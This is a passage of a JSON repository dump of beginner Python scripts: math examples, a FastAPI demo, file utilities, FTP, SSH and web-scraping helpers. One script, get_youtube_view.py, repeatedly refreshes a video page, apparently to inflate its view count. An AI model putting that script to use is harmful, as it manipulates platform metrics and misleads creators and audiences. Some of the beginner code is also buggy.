          "content": "from fastapi import FastAPI\nfrom pydantic import BaseModel\nfrom typing import Optional\n\napp = FastAPI()\n\n# temp database\nfakedb = []\n\n# course model to store courses\nclass Course(BaseModel):\n    id: int\n    name: str\n    price: float\n    is_early_bird: Optional[bool] = None\n\n\n# Home/welcome route\n@app.get(\"/\")\ndef read_root():\n    return {\"greetings\": \"Welcome to LearnCodeOnline.in\"}\n\n\n# Get all courses\n@app.get(\"/courses\")\ndef get_courses():\n    return fakedb\n\n\n# get single course\n@app.get(\"/courses/{course_id}\")\ndef get_a_course(course_id: int):\n    course = course_id - 1\n    return fakedb[course]\n\n\n# add a new course\n@app.post(\"/courses\")\ndef add_course(course: Course):\n    fakedb.append(course.dict())\n    return fakedb[-1]\n\n\n# delete a course\n@app.delete(\"/courses/{course_id}\")\ndef delete_course(course_id: int):\n    fakedb.pop(course_id - 1)\n    return {\"task\": \"deletion successful\"}\n"
        },
        {
          "name": "fetch_news.py",
          "type": "blob",
          "size": 0.5126953125,
          "content": "import requests\n\n_NEWS_API = \"https://newsapi.org/v1/articles?source=bbc-news&sortBy=top&apiKey=\"\n\n\ndef fetch_bbc_news(bbc_news_api_key: str) -> None:\n    # fetching a list of articles in json format\n    bbc_news_page = requests.get(_NEWS_API + bbc_news_api_key).json()\n    # each article in the list is a dict\n    for news, article in enumerate(bbc_news_page[\"articles\"], 1):\n        print(f\"{news}.) {article['title']}\")\n\n\nif __name__ == \"__main__\":\n    fetch_bbc_news(bbc_news_api_key=\"<Your BBC News API key goes here>\")\n"
        },
        {
          "name": "fibonacci.py",
          "type": "blob",
          "size": 1.4462890625,
          "content": "# Fibonacci tool\n# This script only works with Python3!\n\nimport time\n\n\ndef getFibonacciIterative(n: int) -> int:\n    \"\"\"\n    Calculate the fibonacci number at position n iteratively\n    \"\"\"\n\n    a = 0\n    b = 1\n\n    for _ in range(n):\n        a, b = b, a + b\n\n    return a\n\n\ndef getFibonacciRecursive(n: int) -> int:\n    \"\"\"\n    Calculate the fibonacci number at position n recursively\n    \"\"\"\n\n    a = 0\n    b = 1\n\n    def step(n: int) -> int:\n        nonlocal a, b\n        if n <= 0:\n            return a\n        a, b = b, a + b\n        return step(n - 1)\n\n    return step(n)\n\n\ndef getFibonacciDynamic(n: int, fib: list) -> int:\n    \"\"\"\n    Calculate the fibonacci number at position n using dynamic programming to improve runtime\n    \"\"\"\n\n    if n == 0 or n == 1:\n        return n\n    if fib[n] != -1:\n        return fib[n]\n    fib[n] = getFibonacciDynamic(n - 1, fib) + getFibonacciDynamic(n - 2, fib)\n    return fib[n]\n\n\ndef main():\n    n = int(input())\n    fib = [-1] * n\n    getFibonacciDynamic(n, fib)\n\n\ndef compareFibonacciCalculators(n: int) -> None:\n    \"\"\"\n    Interactively compare both fibonacci generators\n    \"\"\"\n\n    startI = time.clock()\n    resultI = getFibonacciIterative(n)\n    endI = time.clock()\n\n    startR = time.clock()\n    resultR = getFibonacciRecursive(n)\n    endR = time.clock()\n\n    s = \"{} calculting {} => {} in {} seconds\"\n    print(s.format(\"Iteratively\", n, resultI, endI - startI))\n    print(s.format(\"Recursively\", n, resultR, endR - startR))\n"
        },
        {
          "name": "fibonacci_SIMPLIFIED",
          "type": "blob",
          "size": 0.275390625,
          "content": "\n#printing fibonnaci series till nth element - simplified version for begginers\ndef print_fibonacci(n):\n    current_no = 1\n    prev_no = 0\n    for i in range(n):\n        print(current_no, end = \" \")\n        prev_no,current_no = current_no, current_no + prev_no\n\nprint_fibonacci(10)\n"
        },
        {
          "name": "fibonici series.py",
          "type": "blob",
          "size": 0.4248046875,
          "content": "nterms = int(input(\"How many terms? \"))\n\n# first two terms\nn1, n2 = 0, 1\ncount = 0\n\n# check if the number of terms is valid\nif nterms <= 0:\n   print(\"Please enter a positive integer\")\nelif nterms == 1:\n   print(\"Fibonacci sequence upto\",nterms,\":\")\n   print(n1)\nelse:\n   print(\"Fibonacci sequence:\")\n   while count < nterms:\n       print(n1)\n       nth = n1 + n2\n       # update values\n       n1 = n2\n       n2 = nth\n       count += 1\n"
        },
        {
          "name": "file_ext_changer.py",
          "type": "blob",
          "size": 3.7734375,
          "content": "'''' Multiple extension changer'''\r\nimport time\r\nfrom pathlib import Path as p\r\nimport random as rand\r\nimport hashlib\r\n\r\n\r\ndef chxten_(files, xten):\r\n    chfile = []\r\n    for file in files:\r\n        ch_file = file.split('.')\r\n        ch_file = ch_file[0]\r\n        chfile.append(ch_file)\r\n    if len(xten) == len(chfile):\r\n        chxten = []\r\n        for i in range(len(chfile)):\r\n            ch_xten = chfile[i] + xten[i]\r\n            chxten.append(ch_xten)\r\n    elif len(xten) < len(chfile) and len(xten) != 1:\r\n        chxten = []\r\n        for i in range(len(xten)):\r\n            ch_xten = chfile[i] + xten[i]\r\n            chxten.append(ch_xten)\r\n        for i in range(1, (len(chfile) + 1) - len(xten)):\r\n            ch_xten = chfile[- + i] + xten[-1]\r\n            chxten.append(ch_xten)\r\n    elif len(xten) == 1:\r\n        chxten = []\r\n        for i in range(len(chfile)):\r\n            ch_xten = chfile[i] + xten[0]\r\n            chxten.append(ch_xten)\r\n    elif len(xten) > len(chfile):\r\n        chxten = []\r\n        for i in range(1, (len(xten) + 1) - len(chfile)):\r\n            f = p(files[-i])\r\n            p.touch(chfile[-i] + xten[-1])\r\n            new = f.read_bytes()\r\n            p(chfile[-i] + xten[-1]).write_bytes(new)\r\n        for i in range(len(chfile)):\r\n            ch_xten = chfile[i] + xten[i]\r\n            chxten.append(ch_xten)\r\n    else:\r\n        return 'an error occured'\r\n    return chxten\r\n\r\n\r\n# End of function definitions\r\n# Beggining of execution of code\r\n#password\r\npassword = input('Enter password:')\r\n\r\npassword = password.encode()\r\n\r\npassword = hashlib.sha512(password).hexdigest()\r\nif password == 'c99d3d8f321ff63c2f4aaec6f96f8df740efa2dc5f98fccdbbb503627fd69a9084073574ee4df2b888f9fe2ed90e29002c318be476bb62dabf8386a607db06c4':\r\n    pass\r\nelse:\r\n    print('wrong password!')\r\n    time.sleep(0.3)\r\n    exit(404)\r\nfiles = input('Enter file names and thier extensions (seperated by commas):')\r\nxten = input('Enter Xtensions to change with (seperated by commas):')\r\n\r\nif files == '*':\r\n    pw = p.cwd()\r\n    files = ''\r\n    for i in pw.iterdir():\r\n        if not p.is_dir(i):\r\n            i = str(i)\r\n            if not i.endswith('.py'):\r\n                # if not i.endswith('exe'):\r\n                if not i.endswith('.log'):\r\n                    files = files + i + ','\r\nif files == 'r':\r\n    pw = p.cwd()\r\n    files = ''\r\n    filer = []\r\n    for i in pw.iterdir():\r\n        if p.is_file(i):\r\n            i = str(i)\r\n            if not i.endswith('.py'):\r\n                if not i.endswith('.exe'):\r\n                    if not i.endswith('.log'):\r\n                        filer.append(i)\r\n    for i in range(5):\r\n        pos = rand.randint(0,len(filer))\r\n        files = files + filer[pos] + ','\r\n\r\n    print(files)\r\nfiles = files.split(',')\r\nxten = xten.split(',')\r\n\r\n# Validation\r\nfor file in files:\r\n    check = p(file).exists()\r\n    if check == False:\r\n        print(f'{file} is not found. Paste this file in the directory of {file}')\r\n        files.remove(file)\r\n# Ended validation\r\n\r\ncount = len(files)\r\nchxten = chxten_(files, xten)\r\n\r\n# Error Handlings\r\nif chxten == 'an error occured':\r\n    print('Check your inputs correctly')\r\n    time.sleep(1)\r\n    exit(404)\r\nelse:\r\n    try:\r\n        for i in range(len(files)):\r\n            f = p(files[i])\r\n            f.rename(chxten[i])\r\n        print('All files has been changed')\r\n    except PermissionError:\r\n        pass\r\n    except FileNotFoundError:\r\n        # Validation\r\n        for file in files:\r\n            check = p(file).exists()\r\n            if check == False:\r\n                print(f'{file} is not found. Paste this file in the directory of {file}')\r\n                files.remove(file)\r\n    # except Exception:\r\n    #     print('An Error Has Occured in exception')\r\n    #     time.sleep(1)\r\n    #     exit(404)\r\n\r\n# last modified 3:25PM 12/12/2023 (DD/MM/YYYY)\r\n"
        },
        {
          "name": "fileinfo.py",
          "type": "blob",
          "size": 2.7216796875,
          "content": "# Script Name       : fileinfo.py\n# Author            : Not sure where I got this from\n# Created           : 28th November 2011\n# Last Modified     : 23th March 2020\n# Version           : 1.0\n# Modifications     :\n\n# Description           : Show file information for a given file\n\n# get file information using os.stat()\n# tested with Python24 vegsaeat 25sep2006\nfrom __future__ import print_function\n\nimport os\nimport stat  # index constants for os.stat()\nimport sys\nimport time\n\nif sys.version_info >= (3, 0):\n    raw_input = input\n\nfile_name = raw_input(\"Enter a file name: \")  # pick a file you have\ncount = 0\nt_char = 0\n\ntry:\n    with open(file_name) as f:\n        # Source: https://stackoverflow.com/a/1019572\n        count = sum(1 for line in f)\n        f.seek(0)\n        t_char = sum([len(line) for line in f])\nexcept FileNotFoundError as e:\n    print(e)\n    sys.exit(1)\n# When open item is a directory (python2)\nexcept IOError:\n    pass\n# When open item is a directory (python3)\nexcept IsADirectoryError:\n    pass\n\nfile_stats = os.stat(file_name)\n# create a dictionary to hold file info\nfile_info = {\n    \"fname\": file_name,\n    \"fsize\": file_stats[stat.ST_SIZE],\n    \"f_lm\": time.strftime(\n        \"%d/%m/%Y %I:%M:%S %p\", time.localtime(file_stats[stat.ST_MTIME])\n    ),\n    \"f_la\": time.strftime(\n        \"%d/%m/%Y %I:%M:%S %p\", time.localtime(file_stats[stat.ST_ATIME])\n    ),\n    \"f_ct\": time.strftime(\n        \"%d/%m/%Y %I:%M:%S %p\", time.localtime(file_stats[stat.ST_CTIME])\n    ),\n    \"no_of_lines\": count,\n    \"t_char\": t_char,\n}\n# print out the file info\nfile_info_keys = (\n    \"file name\",\n    \"file size\",\n    \"last modified\",\n    \"last accessed\",\n    \"creation time\",\n    \"Total number of lines are\",\n    \"Total number of characters are\",\n)\nfile_info_vales = (\n    file_info[\"fname\"],\n    str(file_info[\"fsize\"]) + \" bytes\",\n    file_info[\"f_lm\"],\n    file_info[\"f_la\"],\n    file_info[\"f_ct\"],\n    file_info[\"no_of_lines\"],\n    file_info[\"t_char\"],\n)\n\nfor f_key, f_value in zip(file_info_keys, file_info_vales):\n    print(f_key, \" =\", f_value)\n\n# check the `file` is direcotry\n# print out the file stats\nif stat.S_ISDIR(file_stats[stat.ST_MODE]):\n    print(\"This a directory.\")\nelse:\n    file_stats_fmt = \"\"\n    print(\"\\nThis is not a directory.\")\n    stats_keys = (\n        \"st_mode (protection bits)\",\n        \"st_ino (inode number)\",\n        \"st_dev (device)\",\n        \"st_nlink (number of hard links)\",\n        \"st_uid (user ID of owner)\",\n        \"st_gid (group ID of owner)\",\n        \"st_size (file size bytes)\",\n        \"st_atime (last access time seconds since epoch)\",\n        \"st_mtime (last modification time)\",\n        \"st_ctime (time of creation Windows)\",\n    )\n    for s_key, s_value in zip(stats_keys, file_stats):\n        print(s_key, \" =\", s_value)\n"
        },
        {
          "name": "find_cube_root.py",
          "type": "blob",
          "size": 0.7626953125,
          "content": "# This method is called exhaustive numeration!\n# I am checking every possible value\n# that can be root of given x systematically\n# Kinda brute forcing\n\n\ndef cubeRoot():\n    x = int(input(\"Enter an integer: \"))\n    for ans in range(0, abs(x) + 1):\n        if ans ** 3 == abs(x):\n            break\n    if ans ** 3 != abs(x):\n        print(x, \"is not a perfect cube!\")\n    else:\n        if x < 0:\n            ans = -ans\n    print(\"Cube root of \" + str(x) + \" is \" + str(ans))\n\n\ncubeRoot()\n\ncont = input(\"Would you like to continue: \")\nwhile cont == \"yes\" or \"y\":\n    cubeRoot()\n    cont = input(\"Would you like to continue: \")\n    if cont == \"no\" or \"n\":\n        exit()\n    else:\n        print(\"Enter a correct answer(yes or no)\")\n        cont = input(\"Would you like to continue: \")\n"
        },
        {
          "name": "find_prime.py",
          "type": "blob",
          "size": 2.05859375,
          "content": "\"\"\"Author Anurag Kumar(mailto:anuragkumara95@gmail.com)\n\nA prime number is a natural number that has exactly two distinct natural number divisors: 1 and itself.\n\n#USAGE:\n  - $pythonfind_prime.py <num:int>\n\n##THEORY\n-Sieve of Eratosthenes(source:wikipedia.com)\n    In mathematics, the sieve of Eratosthenes is a simple, ancient algorithm for finding all prime numbers up to any given limit.\n\n    It does so by iteratively marking as composite (i.e., not prime) the multiples of each prime, starting with the first prime \n    number, 2. The multiples of a given prime are generated as a sequence of numbers starting from that prime, with constant \n    difference between them that is equal to that prime. This is the sieve's key distinction from using trial division to \n    sequentially test each candidate number for divisibility by each prime.\n\n    To find all the prime numbers less than or equal to a given integer n by Eratosthenes' method:\n\n      - Create a list of consecutive integers from 2 through n: (2, 3, 4, ..., n).\n      - Initially, let p equal 2, the smallest prime number.\n      - Enumerate the multiples of p by counting to n from 2p in increments of p, and mark them in the list (these will be 2p, \n        3p, 4p, ...; the p itself should not be marked).\n      - Find the first number greater than p in the list that is not marked. If there was no such number, stop. Otherwise, let \n        p now equal this new number (which is the next prime), and repeat from step 3.\n      - When the algorithm terminates, the numbers remaining not marked in the list are all the primes below n.\n\"\"\"\nimport sys\n\n\ndef find_prime(num):\n    res_list = []\n    for i in range(2, num + 1):\n        if res_list != [] and any(i % l == 0 for l in res_list):\n            continue\n        res_list.append(i)\n    return res_list\n\n\nif __name__ == \"__main__\":\n    if len(sys.argv) != 2:\n        raise Exception(\"usage - $python find_prime.py <num:int>\")\n    try:\n        num = int(sys.argv[1])\n    except ValueError:\n        raise Exception(\"Enter an integer as argument only.\")\n    l = find_prime(num)\n    print(l)\n"
        },
        {
          "name": "finding LCM.py",
          "type": "blob",
          "size": 0.3818359375,
          "content": "\n# Python Program to find the L.C.M. of two input number\n\ndef compute_lcm(x, y):\n\n   # choose the greater number\n   if x > y:\n       greater = x\n   else:\n       greater = y\n\n   while(True):\n       if((greater % x == 0) and (greater % y == 0)):\n           lcm = greater\n           break\n       greater += 1\n\n   return lcm\n\nnum1 = 54\nnum2 = 24\n\nprint(\"The L.C.M. is\", compute_lcm(num1, num2))\n"
        },
        {
          "name": "findlargestno.md",
          "type": "blob",
          "size": 0.537109375,
          "content": "# Python program to find the largest number among the three input numbers\n\n# change the values of num1, num2 and num3\n# for a different result\nnum1 = 10\nnum2 = 14\nnum3 = 12\n\n# uncomment following lines to take three numbers from user\n#num1 = float(input(\"Enter first number: \"))\n#num2 = float(input(\"Enter second number: \"))\n#num3 = float(input(\"Enter third number: \"))\n\nif (num1 >= num2) and (num1 >= num3):\n   largest = num1\nelif (num2 >= num1) and (num2 >= num3):\n   largest = num2\nelse:\n   largest = num3\n\nprint(\"The largest number is\", largest)\n"
        },
        {
          "name": "flappyBird_pygame",
          "type": "tree",
          "content": null
        },
        {
          "name": "floodfill",
          "type": "tree",
          "content": null
        },
        {
          "name": "folder_size.py",
          "type": "blob",
          "size": 1.5390625,
          "content": "# Script Name   : folder_size.py\n# Author        : Craig Richards\n# Created       : 19th July 2012\n# Last Modified\t: 22 February 2016\n# Version       : 1.0.1\n\n# Modifications : Modified the Printing method and added a few comments\n\n# Description   : This will scan the current directory and all subdirectories and display the size.\n\nimport os\nimport sys  # Load the library module and the sys module for the argument vector'''\n\ntry:\n    directory = sys.argv[\n        1\n    ]  # Set the variable directory to be the argument supplied by user.\nexcept IndexError:\n    sys.exit(\"Must provide an argument.\")\n\ndir_size = 0  # Set the size to 0\nfsizedicr = {\n    \"Bytes\": 1,\n    \"Kilobytes\": float(1) / 1024,\n    \"Megabytes\": float(1) / (1024 * 1024),\n    \"Gigabytes\": float(1) / (1024 * 1024 * 1024),\n}\nfor (path, dirs, files) in os.walk(\n    directory\n):  # Walk through all the directories. For each iteration, os.walk returns the folders, subfolders and files in the dir.\n    for file in files:  # Get all the files\n        filename = os.path.join(path, file)\n        dir_size += os.path.getsize(\n            filename\n        )  # Add the size of each file in the root dir to get the total size.\n\nfsizeList = [\n    str(round(fsizedicr[key] * dir_size, 2)) + \" \" + key for key in fsizedicr\n]  # List of units\n\nif dir_size == 0:\n    print(\"File Empty\")  # Sanity check to eliminate corner-case of empty file.\nelse:\n    for units in sorted(fsizeList)[\n        ::-1\n    ]:  # Reverse sort list of units so smallest magnitude units print first.\n        print(\"Folder Size: \" + units)\n"
        },
        {
          "name": "four_digit_num_combination.py",
          "type": "blob",
          "size": 0.5,
          "content": "\"\"\" small script to learn how to print out all 4-digit num\"\"\"\r\n\r\n\r\n# ALL the combinations of 4 digit combo\r\ndef four_digit_combinations():\r\n    \"\"\"print out all 4-digit numbers in old way\"\"\"\r\n    numbers = []\r\n    for code in range(10000):\r\n        code = str(code).zfill(4)\r\n        print(code)\r\n        numbers.append(code)\r\n\r\n\r\n# Same as above but more pythonic\r\ndef one_line_combinations():\r\n    \"\"\"print out all 4-digit numbers\"\"\"\r\n    numbers = [str(i).zfill(4) for i in range(10000)]\r\n    print(numbers)\r\n"
        },
        {
          "name": "framework",
          "type": "tree",
          "content": null
        },
        {
          "name": "friday.py",
          "type": "blob",
          "size": 0.390625,
          "content": "import pyttsx3\r\nimport os\r\n\r\nvar = 1\r\n\r\nwhile var > 0:\r\n    pyttsx3.speak(\"How can I help you Sir\")\r\n    print(\"How can I help you Sir : \", end=\"\")\r\n    x = input()\r\n    if ((\"notepad\" in x) or (\"Notepad\" in x)) and (\r\n        (\"open\" in x) or (\"run\" in x) or (\"Open\" in x) or (\"Run\" in x)\r\n    ):\r\n        pyttsx3.speak(\"Here it is , sir\")\r\n        os.system(\"notepad\")\r\n    print(\"anything more\")\r\n"
        },
        {
          "name": "ftp_send_receive.py",
          "type": "blob",
          "size": 1.09765625,
          "content": "\"\"\"\n\tFile transfer protocol used to send and receive files using FTP server.\n\tUse credentials to provide access to the FTP client\n\n\tNote: Do not use root username & password for security reasons\n\t\t  Create a seperate user and provide access to a home directory of the user\n\t\t  Use login id and password of the user created \n\t\t  cwd here stands for current working directory\n\"\"\"\n\nfrom ftplib import FTP\n\nftp = FTP(\"xxx.xxx.x.x\")  # Enter the ip address or the domain name here\nftp.login(user=\"username\", passwd=\"password\")\nftp.cwd(\"/Enter the directory here/\")\n\n\"\"\"\n\tThe file which will be received via the FTP server\n\tEnter the location of the file where the file is received\n\"\"\"\n\n\ndef receive_file(filename=\"example.txt\"):\n    with open(filename, \"wb\") as out_file:\n        ftp.retrbinary(\"RETR \" + filename, out_file.write, 1024)\n        ftp.quit()\n\n\n\"\"\"\n\tThe file which will be sent via the FTP server\n\tThe file send will be send to the current working directory\n\"\"\"\n\n\ndef send_file(filename=\"example.txt\"):\n    with open(filename, \"rb\") as in_file:\n        ftp.storbinary(\"STOR \" + filename, in_file)\n        ftp.quit()\n"
        },
        {
          "name": "gambler.py",
          "type": "blob",
          "size": 0.4404296875,
          "content": "import random\nfrom sys import argv\n\nstake = int(argv[1])\ngoals = int(argv[2])\ntrials = int(argv[3])\n\nwins = 0\nbets = 0\n\nfor i in range(trials):\n    cash = stake\n    while cash > 0 and cash < goals:\n        bets += 1\n        if random.randrange(0, 2) == 0:\n            cash += 1\n        else:\n            cash -= 1\n    if cash == goals:\n        wins += 1\nprint(\"Your won: \" + str(100 * wins // trials) + \"$\")\nprint(\"Your bets: \" + str(bets // trials))\n"
        },
        {
          "name": "game_of_life",
          "type": "tree",
          "content": null
        },
        {
          "name": "gcd.py",
          "type": "blob",
          "size": 0.3486328125,
          "content": "\"\"\"\nalthough there is function to find gcd in python but this is the code which\ntakes two inputs and prints gcd of the two.\n\"\"\"\na = int(input(\"Enter number 1 (a): \"))\nb = int(input(\"Enter number 2 (b): \"))\n\ni = 1\nwhile i <= a and i <= b:\n    if a % i == 0 and b % i == 0:\n        gcd = i\n    i = i + 1\n\nprint(\"\\nGCD of {0} and {1} = {2}\".format(a, b, gcd))\n"
        },
        {
          "name": "generate_permutations.py",
          "type": "blob",
          "size": 0.3388671875,
          "content": "def generate(A,k):\n    if k ==1:\n        print(A)\n        return\n    else:\n        for i in range(k):\n            generate(A,k-1)\n            if(i<k-1):\n                if k%2 == 0:\n                    A[i],A[k-1] = A[k-1],A[i]\n                else:\n                    A[0],A[k-1] = A[k-1],A[0]\n\nA = [1,2,3,4] #test-case\nx = len(A)\ngenerate(A,x)\n"
        },
        {
          "name": "get_crypto_price.py",
          "type": "blob",
          "size": 1,
          "content": "import ccxt\n\n\ndef getprice(symbol, exchange_id):\n    symbol = symbol.upper()  # BTC/USDT, LTC/USDT, ETH/BTC, LTC/BTC\n    exchange_id = exchange_id.lower()  # binance, #bitmex\n    symbol_1 = symbol.split(\"/\")\n    exchange = getattr(ccxt, exchange_id)(\n        {\n            # https://github.com/ccxt/ccxt/wiki/Manual#rate-limit\n            \"enableRateLimit\": True\n        }\n    )\n    try:\n        v_price = exchange.fetch_ticker(symbol)\n        r_price = v_price[\"info\"][\"lastPrice\"]\n        if symbol_1[1] == \"USD\" or symbol_1[1] == \"USDT\":\n            v_return = \"{:.2f} {}\".format(float(r_price), symbol_1[1])\n            return v_return\n        else:\n            v_return = \"{:.8f} {}\".format(float(r_price), symbol_1[1])\n            return v_return\n    except (ccxt.ExchangeError, ccxt.NetworkError) as error:\n        # add necessary handling or rethrow the exception\n        return \"Got an error\", type(error).__name__, error.args\n    raise\n\n\nprint(getprice(\"btc/usdt\", \"BINANCE\"))\nprint(getprice(\"btc/usd\", \"BITMEX\"))\n"
        },
        {
          "name": "get_info_remoute_srv.py",
          "type": "blob",
          "size": 0.8603515625,
          "content": "# Script Name   : get_info_remoute_srv.py\n# Author        : Pavel Sirotkin\n# Created       : 3th April 2016\n# Last Modified\t: -\n# Version       : 1.0.0\n\n# Modifications :\n\n# Description   : this will get info about remoute server on linux through ssh connection. Connect these servers must be through keys\n\nimport subprocess\n\nHOSTS = (\"proxy1\", \"proxy\")\n\nCOMMANDS = (\"uname -a\", \"uptime\")\n\nfor host in HOSTS:\n    result = []\n    for command in COMMANDS:\n        ssh = subprocess.Popen(\n            [\"ssh\", \"%s\" % host, command],\n            shell=False,\n            stdout=subprocess.PIPE,\n            stderr=subprocess.PIPE,\n        )\n        result.append(ssh.stdout.readlines())\n    print(\"--------------- \" + host + \" --------------- \")\n    for res in result:\n        if not res:\n            print(ssh.stderr.readlines())\n            break\n        else:\n            print(res)\n"
        },
        {
          "name": "get_likes_on_FB.py",
          "type": "blob",
          "size": 0.8916015625,
          "content": "from __future__ import print_function\n\nimport json\nimport sys\nimport urllib\n\naccessToken = \"TOKENVALUE\"  # YOUR ACCESS TOKEN GETS INSERTED HERE\nuserId = sys.argv[1]  # USERID\nlimit = 100\n\nurl = (\n    \"https://graph.facebook.com/\"\n    + userId\n    + \"/posts?access_token=\"\n    + accessToken\n    + \"&limit=\"\n    + str(limit)\n)  # FB Link\ndata = json.load(urllib.urlopen(url))\nid = 0\n\nprint(str(id))\n\nfor item in data[\"data\"]:\n    time = item[\"created_time\"][11:19]\n    date = item[\"created_time\"][5:10]\n    year = item[\"created_time\"][0:4]\n\nif \"shares\" in item:\n    num_share = item[\"shares\"][\"count\"]\nelse:\n    num_share = 0\nif \"likes\" in item:\n    num_like = item[\"likes\"][\"count\"]\nelse:\n    num_like = 0\n\nid += 1\n\nprint(\n    str(id)\n    + \"\\t\"\n    + time.encode(\"utf-8\")\n    + \"\\t\"\n    + date.encode(\"utf-8\")\n    + \"\\t\"\n    + year.encode(\"utf-8\")\n    + \"\\t\"\n    + str(num_share)\n    + \"\\t\"\n    + str(num_like)\n)\n"
        },
        {
          "name": "get_youtube_view.py",
          "type": "blob",
          "size": 1.224609375,
          "content": "\"\"\"\nCreated on Thu Apr 27 16:28:36 2017\n@author: barnabysandeford\n\"\"\"\n# Currently works for Safari, but just change to whichever\n# browser you're using.\n\nimport time\n\n# Added pafy to get video length for the user\nimport pafy\n\n# Changed the method of opening the browser.\n# Selenium allows for the page to be refreshed.\nfrom selenium import webdriver\n\n# adding ability to change number of repeats\ncount = int(input(\"Number of times to be repeated: \"))\n# Same as before\nurl = input(\"Enter the URL : \")\n\nrefreshrate = None\n\n# tries to get video length using pafy\ntry:\n    video = pafy.new(url)\n    if hasattr(video, \"length\"):\n        refreshrate = video.length\n# if pafy fails to work, prints out error and asks for video length from the user\nexcept Exception as e:\n    print(e)\n    print(\"Length of video:\")\n    minutes = int(input(\"Minutes \"))\n    seconds = int(input(\"Seconds \"))\n    # Calculating the refreshrate from the user input\n    refreshrate = minutes * 60 + seconds\n\n# Selecting Safari as the browser\ndriver = webdriver.Safari()\n\nif url.startswith(\"https://\"):\n    driver.get(url)\nelse:\n    driver.get(\"https://\" + url)\n\nfor i in range(count):\n    # Sets the page to refresh at the refreshrate.\n    time.sleep(refreshrate)\n    driver.refresh()\n"
        },
        {
          "name": "google.py",
          "type": "blob",
          "size": 0.8603515625,
          "content": "\"\"\"\nAuthor: Ankit Agarwal (ankit167)\nUsage: python google.py <keyword>\nDescription: Script googles the keyword and opens\n             top 5 (max) search results in separate\n             tabs in the browser\nVersion: 1.0\n\"\"\"\n\nimport sys\nimport webbrowser\n\nimport bs4\nimport pyperclip\nimport requests\n\n\ndef main():\n    if len(sys.argv) > 1:\n        keyword = \" \".join(sys.argv[1:])\n    else:\n        # if no keyword is entered, the script would search for the keyword\n        # copied in the clipboard\n        keyword = pyperclip.paste()\n\n    res = requests.get(\"http://google.com/search?q=\" + keyword)\n    res.raise_for_status()\n    soup = bs4.BeautifulSoup(res.text)\n    linkElems = soup.select(\".r a\")\n    numOpen = min(5, len(linkElems))\n\n    for i in range(numOpen):\n        webbrowser.open(\"http://google.com\" + linkElems[i].get(\"href\"))\n\n\nif __name__ == \"__main__\":\n    main()\n"
        },
        {
          "name": "googlemaps.py",
          "type": "blob",
          "size": 0.3994140625,
          "content": "import requests\nimport json\nimport geocoder\n\ng = geocoder.ip(\"me\")\n\nlat = g.latlng[0]\n\nlongi = g.latlng[1]\nquery = input(\"Enter the query\")\n\nkey = \"your_api_key\"\nurl = (\n    \"https://maps.googleapis.com/maps/api/place/nearbysearch/json?location=\"\n    + str(lat)\n    + \",\"\n    + str(longi)\n    + \"radius=1000\"\n)\n\nr = requests.get(url + \"query=\" + query + \"&key=\" + key)\n\nx = r.json()\ny = x[\"results\"]\nprint(y)\n"
        },
        {
          "name": "googleweb.py",
          "type": "blob",
          "size": 3.0537109375,
          "content": "from fuzzywuzzy import fuzz\nimport bs4, requests\nimport numpy as np\nimport pandas as pd\nimport os\nrequests.packages.urllib3.disable_warnings()\nFinalResult=[]\ndef SearchResults():\n    lis = []\n    f = open(\"Input\", \"r\")\n    header = {\n        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36'}\n    StabUrl = \"https://www.google.com/search?rlz=1C1CHBD_enIN872IN872&sxsrf=ALeKk03OHYAnSxX60oUwmblKn36Hyi8MhA%3A1600278715451&ei=u1BiX9ibG7qU4-EP_qGPgA8&q=\"\n    midUrl = \"&oq=\"\n    EndUrl = \"&gs_lcp=CgZwc3ktYWIQAzoECAAQR1C11AxYtdQMYJXcDGgAcAF4AIABpQKIAaUCkgEDMi0xmAEAoAECoAEBqgEHZ3dzLXdpesgBCMABAQ&sclient=psy-ab&ved=0ahUKEwiY5YDjnu7rAhU6yjgGHf7QA_AQ4dUDCA0&uact=5\"\n    for i in f:\n        singleLink=[]\n        singleRatio=[]\n        singleWrite=[]\n        singleWrite.append(i.strip(\"\\n\"))\n        checkString=i.replace(\"+\",\"\")\n        searchString=i.replace(\"+\",\"%2B\")\n        searchString=searchString.replace(\" \",\"+\")\n        searchString=StabUrl+searchString+midUrl+searchString+EndUrl\n        r = requests.get(searchString, headers=header)\n        soup = bs4.BeautifulSoup(r.text, features=\"html.parser\")\n        elements = soup.select(\".r a\")\n        for g in elements:\n            lis.append(g.get(\"href\"))\n        for k in lis:\n            sentence=\"\"\n            if (k[0] != \"#\") and k[0] != \"/\":\n                checker = k[8:16]\n                if (checker != \"webcache\"):\n                    rr = requests.get(k, headers=header, verify=False)\n                    soupInside = bs4.BeautifulSoup(rr.text, features=\"html.parser\")\n                    elementInside=soupInside.select(\"body\")\n                    for line in elementInside:\n                        sentence=sentence+line.text\n                    ratio=fuzz.token_set_ratio(sentence,checkString)\n                    if(ratio>80):\n                        singleLink.append(k)\n                        singleRatio.append(ratio)\n        if(len(singleLink)>=4):\n            singleLink=np.array(singleLink)\n            singleRatio=np.array(singleRatio)\n            inds=singleRatio.argsort()\n            sortedLink=singleLink[inds]\n            sortedFinalList=list(sortedLink[::-1])\n            sortedFinalList=sortedFinalList[:4]\n            FinalResult.append(singleWrite+sortedFinalList)\n        elif(len(singleLink)<4) and len(singleLink)>0:\n            singleLink = np.array(singleLink)\n            singleRatio = np.array(singleRatio)\n            inds = singleRatio.argsort()\n            sortedLink = singleLink[inds]\n            sortedFinalList = list(sortedLink[::-1])\n            sortedFinalList=sortedFinalList+(4-len(sortedFinalList))*[[\" \"]]\n            FinalResult.append(singleWrite + sortedFinalList)\n        else:\n            sortedFinalList=[[\" \"]]*4\n            FinalResult.append(singleWrite+sortedFinalList)\n\n\nSearchResults()\nFinalResult=np.array(FinalResult)\nFinalResult=pd.DataFrame(FinalResult)\nFinalResult.columns=[\"Input\",\"Link A\",\"Link B\",\"Link C\",\"Link D\"]\nFinalResult.replace(\" \",np.nan)\nFinalResult.to_csv(\"Susma.csv\",index=False)\nprint(FinalResult)\n"
        },
        {
          "name": "greaterno.py",
          "type": "blob",
          "size": 0.537109375,
